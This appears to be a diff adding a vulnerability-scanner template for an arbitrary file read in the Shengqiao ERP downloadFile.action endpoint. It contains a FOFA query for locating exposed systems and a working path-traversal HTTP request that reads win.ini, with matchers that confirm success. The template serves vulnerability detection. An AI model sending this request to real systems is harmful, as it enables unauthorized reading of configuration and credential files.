@@ -1,0 +1,33 @@
+id: shengqiaoERP-downloadFile_action-File-reading
+
+info:
+  name: "圣乔 ERP 系统 downloadFile.action 接口任意文件读取漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="圣乔ERP系统"
+      圣乔ERP系统 downloadFile.action 接口未正确验证用户权限，攻击者可构造特定请求读取任意文件。该漏洞允许未经授权的访问者获取数据库配置文件、系统配置文件等敏感数据，导致系统关键信息暴露并可能引发后续入侵行为。
+  reference:
+  - https://mp.weixin.qq.com/s/n4R95MCMo1ltDLNE1Vk1GQ?token=1192656222&lang=zh_CN
+  tags: 圣乔ERP系统
+
+
+http:
+- raw:
+  - |
+    GET /erp/wap/../downloadFile.action?absolutePath=true&file=c:\\windows\win.ini HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '; for 16-bit app support'
+  - type: status
+    status:
+    - 200
